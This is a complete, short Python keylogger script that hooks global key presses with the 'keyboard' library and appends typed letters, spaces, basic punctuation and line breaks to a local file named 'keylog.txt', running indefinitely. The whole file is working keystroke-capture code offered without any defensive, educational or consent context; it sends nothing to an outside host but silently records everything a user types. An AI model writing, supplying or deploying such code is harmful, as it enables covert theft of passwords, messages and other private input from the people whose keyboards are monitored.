import keyboard
import os

LOG_FILE = 'keylog.txt'

def on_key_press(event):
    key = event.name
    char_to_write = None
    
    if key.isalpha():
        char_to_write = key
    elif key == 'space':
        char_to_write = ' '
    elif key in [',', '.', '!', '?']:
        char_to_write = key
    elif key == 'enter':
        char_to_write = '\n'
    
    if char_to_write:
        with open(LOG_FILE, 'a') as f:
            f.write(char_to_write)

keyboard.on_press(on_key_press)
keyboard.wait()
